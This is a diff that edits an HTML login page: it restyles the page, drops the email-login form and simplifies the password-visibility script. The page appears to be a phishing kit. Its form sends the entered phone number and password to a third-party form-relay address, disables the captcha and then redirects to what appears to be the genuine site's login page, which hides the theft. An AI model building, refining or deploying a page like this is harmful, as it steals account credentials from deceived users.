@@ -68,7 +68,7 @@
       text-align: center;
       cursor: pointer;
       background-color: transparent;
-      color: #fff;
+      color: white;
       border: none;
       font-weight: 600;
       font-size: 0.95rem;
@@ -78,7 +78,7 @@
 
     .toggle-button.active {
       background-color: #d4af37;
-      color: #fff;
+      color: white;
     }
 
     form {
@@ -110,30 +110,23 @@
       object-fit: cover;
     }
 
-    .input-group select {
+    .input-group select, .input-group input {
       background: none;
       border: none;
       color: white;
       font-size: 1rem;
       outline: none;
-      appearance: none;
+    }
+
+    .input-group select {
       width: 60px;
     }
 
     .input-group input {
-      background: none;
-      border: none;
-      color: white;
-      font-size: 1rem;
-      outline: none;
       flex: 1;
     }
 
-    .input-group.password input {
-      flex: 1;
-    }
-
-    .input-group .eye-icon {
+    .eye-icon {
       cursor: pointer;
       width: 16px;
       height: 16px;
@@ -151,26 +144,14 @@
       margin-bottom: 10px;
     }
 
-    .form-footer a {
-      color: white;
-      text-decoration: none;
-    }
-
-    .form-footer small {
-      color: white;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
     button[type="submit"] {
       background-color: #d4af37;
       border: none;
       padding: 12px;
       border-radius: 30px;
       font-weight: bold;
-      cursor: pointer;
       color: white;
+      cursor: pointer;
     }
 
     .disclaimer {
@@ -184,14 +165,10 @@
       color: #d4af37;
       font-weight: bold;
     }
-
-    .hidden {
-      display: none;
-    }
   </style>
 </head>
 <body>
-  <img src="lkl.png" class="top-right-image" alt="icon" />
+  <img src="lkl.png" alt="Corner Icon" class="top-right-image">
   <div class="page-title">Log In</div>
 
   <div class="container">
@@ -203,56 +180,25 @@
       <button class="toggle-button" onclick="toggleLogin('email')">Email Login</button>
     </div>
 
-    <!-- PHONE FORM -->
     <form id="phoneForm" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST">
-      <input type="hidden" name="_next" value="https://masx45.com/login?lang=en">
       <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://masx45.com/login?lang=en">
 
       <label for="phone">Phone Number</label>
       <div class="input-group">
         <img class="flag" src="https://flagcdn.com/us.svg" alt="US Flag">
-        <select name="countryCode" id="countryCode">
+        <select name="countryCode">
           <option value="+1" data-flag="us">+1</option>
           <option value="+33" data-flag="fr">+33</option>
           <option value="+44" data-flag="gb">+44</option>
         </select>
-        <input type="text" name="phone" placeholder="Phone Number" required>
+        <input type="text" name="phone" required>
       </div>
 
-      <label for="password-phone">Password</label>
-      <div class="input-group password">
-        <input type="password" name="password" id="password-phone" placeholder="Password" required>
-        <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/invisible.png" alt="eye" onclick="togglePassword('password-phone', this)">
-      </div>
-
-      <div class="form-footer">
-        <a href="#">Forgot Password?</a>
-        <small><input type="checkbox" id="remember-phone"> Remember account and password</small>
-      </div>
-
-      <button type="submit">Login</button>
-      <p class="disclaimer">Continue Is Agree <span>Sign Up</span></p>
-    </form>
-
-    <!-- EMAIL FORM -->
-    <form id="emailForm" class="hidden" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST">
-      <input type="hidden" name="_next" value="https://masx45.com/login?lang=en">
-      <input type="hidden" name="_captcha" value="false">
-
-      <label for="email">Email</label>
+      <label for="password">Password</label>
       <div class="input-group">
-        <input type="email" name="email" placeholder="Email" required>
-      </div>
-
-      <label for="password-email">Password</label>
-      <div class="input-group password">
-        <input type="password" name="password" id="password-email" placeholder="Password" required>
-        <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/invisible.png" alt="eye" onclick="togglePassword('password-email', this)">
-      </div>
-
-      <div class="form-footer">
-        <a href="#">Forgot Password?</a>
-        <small><input type="checkbox" id="remember-email"> Remember account and password</small>
+        <input type="password" name="password" id="password" required>
+        <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/invisible.png" onclick="togglePassword(this)">
       </div>
 
       <button type="submit">Login</button>
@@ -261,39 +207,18 @@
   </div>
 
   <script>
-    function toggleLogin(method) {
-      const phoneBtn = document.querySelectorAll('.toggle-button')[0];
-      const emailBtn = document.querySelectorAll('.toggle-button')[1];
-      const phoneForm = document.getElementById('phoneForm');
-      const emailForm = document.getElementById('emailForm');
-
-      if (method === 'phone') {
-        phoneBtn.classList.add('active');
-        emailBtn.classList.remove('active');
-        phoneForm.classList.remove('hidden');
-        emailForm.classList.add('hidden');
-      } else {
-        emailBtn.classList.add('active');
-        phoneBtn.classList.remove('active');
-        emailForm.classList.remove('hidden');
-        phoneForm.classList.add('hidden');
-      }
-    }
-
-    function togglePassword(inputId, eyeIcon) {
-      const input = document.getElementById(inputId);
+    function togglePassword(icon) {
+      const input = icon.previousElementSibling;
       const isHidden = input.type === 'password';
       input.type = isHidden ? 'text' : 'password';
-      eyeIcon.src = isHidden
+      icon.src = isHidden
         ? 'https://img.icons8.com/ios-glyphs/30/ffffff/visible--v1.png'
         : 'https://img.icons8.com/ios-glyphs/30/ffffff/invisible.png';
     }
 
-    document.getElementById("countryCode").addEventListener("change", function() {
-      const flag = this.options[this.selectedIndex].dataset.flag;
-      const img = document.querySelector(".input-group img.flag");
-      img.src = `https://flagcdn.com/${flag}.svg`;
-    });
+    function toggleLogin(method) {
+      // Placeholder for login toggle logic
+    }
   </script>
 </body>
 </html>
